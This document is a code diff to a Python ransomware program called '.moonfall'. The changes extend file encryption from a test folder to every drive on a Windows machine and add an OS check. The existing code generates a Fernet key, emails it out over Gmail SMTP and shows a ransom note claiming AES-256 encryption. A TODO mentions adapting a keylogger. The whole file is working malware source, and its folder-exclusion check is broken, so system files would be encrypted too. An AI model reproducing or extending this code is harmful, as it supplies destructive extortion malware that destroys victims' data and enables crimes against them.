@@ -10,17 +10,19 @@ from email.mime.base import MIMEBase
 from email import encoders
 import datetime
 import oschmod
+import sys
+import platform
+import win32api
+import subprocess
+import ctypes
+
 
 brand_name = '.moonfall'
-
-extension_list = ['.pdf', '.doc', '.docx', '.xls',
-                  '.xslx', '.ppt', '.pptx', '.pages']  # TODO
-
-protected_folders = ['PerfLogs', 'Windows', 'Internet Explorer']  # TODO
+protected_folders = ['PerfLogs', 'Windows']
 
 
 """
-Send password by mail as a feature ?
+    #TODO Keylogger method should be adapted
 """
 def send_key_by_mail(sender, sender_password, reciever):
     server = 'smtp.gmail.com'
@@ -53,6 +55,9 @@ def send_key_by_mail(sender, sender_password, reciever):
     s.quit()
 
 
+"""
+    Generate the key using Fernet module
+"""
 def write_key():
     key = Fernet.generate_key()
 
@@ -60,10 +65,16 @@ def write_key():
         key_file.write(key)
 
 
+"""
+    Load the generated key
+"""
 def load_key():
     return open("key.key", "rb").read()
 
 
+"""
+    Save the data checking permissions
+"""
 def save_data(filename, data, opt='add_ext'):
     if os.access(filename, os.W_OK):
         oschmod.set_mode(filename, "a+rwx,g-w,o-x") #TODO repasar permisos
@@ -79,12 +90,19 @@ def save_data(filename, data, opt='add_ext'):
         raise ValueError('Invalid argument')
 
 
+"""
+    Load the data and enables permissions
+"""
 def load_data(filename):
     if not os.access(filename, os.R_OK):
         oschmod.set_mode(filename, "a+rwx,g-w,o-x")
     with open(filename, 'rb') as file:
         return file.read()
 
+
+"""
+    Function to encrypt or decrypt the data using the key
+"""
 def encrypt_or_decrypt(filename, key, opt='encrypt'):
     try:
         f = Fernet(key)
@@ -109,23 +127,31 @@ def encrypt_or_decrypt(filename, key, opt='encrypt'):
 
 
 if __name__ == '__main__':
+    if platform.system() != 'Windows': # Checking host os
+        sys.exit()
+        
     write_key()
     key = load_key()
 
-    root = 'C:/'
+    local_drives = win32api.GetLogicalDriveStrings() # Cheking drives connected
+    local_drives = local_drives.split('\000')[:-1]
+
+    """
     root_osx = '/Users/marcosplazagonzalez/Desktop/test'
     root_win = 'C:/Users/marco/OneDrive/Escritorio/test'
     root_vm_win = 'C:/Users/IEUser/test/'
+    """
+    
+    # Iterative algorithm TODO Inefficient
+    for d in local_drives:
+        for root, dirs, files in os.walk(d):
+            if dirs in protected_folders:
+                continue
+            for fn in files:
+                full_path = root + os.sep + fn
+                encrypt_or_decrypt(full_path, key)
 
-    # ITERATE AND ENCRYPT
-    for root, dirs, files in os.walk(root):
-        if dirs in protected_folders:
-            continue
-        for fn in files:
-            full_path = root + os.sep + fn
-            encrypt_or_decrypt(full_path, key)
-
-    # RANSOM NOTE
+    # Show Ransom note
     sg.theme('DarkRed2')
     layout = [	[sg.Text('Attention your files have been encrypted under a strong\n encryption algorithm called AES-256', font='Helvetica 18')],
                [sg.Text('')],
@@ -155,18 +181,19 @@ if __name__ == '__main__':
             event, values = window.read()
             key = values[0]
 
-            # ITERATE AND DECRYPT
-            for root, dirs, files in os.walk(root):
-                if dirs in protected_folders:
-                    continue
-                for fn in files:
-                    full_path = root + os.sep + fn
-                    try:
-                        encrypt_or_decrypt(full_path, key, opt='decrypt')
-                        count += 1
-                    except Exception as e:
-                        print(e)
-                        break
+            # TODO Inefficient
+            for d in local_drives:
+                for root, dirs, files in os.walk(root):
+                    if dirs in protected_folders:
+                        continue
+                    for fn in files:
+                        full_path = root + os.sep + fn
+                        try:
+                            encrypt_or_decrypt(full_path, key, opt='decrypt')
+                            count += 1
+                        except Exception as e:
+                            print(e)
+                            break
             if count > 0:
                 break
         except Exception as e:
